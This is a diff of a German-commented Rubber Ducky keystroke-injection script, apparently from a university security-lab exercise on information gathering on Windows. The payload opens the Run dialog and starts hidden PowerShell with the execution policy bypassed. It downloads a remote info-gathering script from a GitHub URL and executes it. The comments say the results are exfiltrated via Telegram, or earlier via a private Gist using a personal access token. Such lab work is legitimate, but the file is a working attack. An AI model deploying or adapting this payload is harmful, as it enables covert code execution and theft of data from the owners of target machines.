@@ -3,18 +3,11 @@ REM  W02a.2 – Rubber Ducky: Information Gathering
 REM  Autoren: Raphael Bleier, Joachim Lugger
 REM  Ziel-OS: Windows
 REM
-REM  Lädt info_gather.ps1 von einem öffentlichen GitHub Gist.
-REM  Exfiltration erfolgt als privates GitHub Gist – kein
-REM  lokaler Server nötig, funktioniert über alle Subnetze.
-REM
-REM  Setup:
-REM    1. info_gather.ps1 als öffentliches Gist hochladen
-REM    2. GITHUB_PAT in info_gather.ps1 eintragen
-REM    3. GIST_RAW_URL unten ersetzen (Raw-URL des Gists)
+REM  Lädt info_gather.ps1 direkt von GitHub.
+REM  Ergebnis kommt per Telegram – kein Server nötig.
 REM ============================================================
 
 DELAY 2000
-
 GUI r
 DELAY 500
-STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('GIST_RAW_URL');"
+STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/info_gather.ps1');"
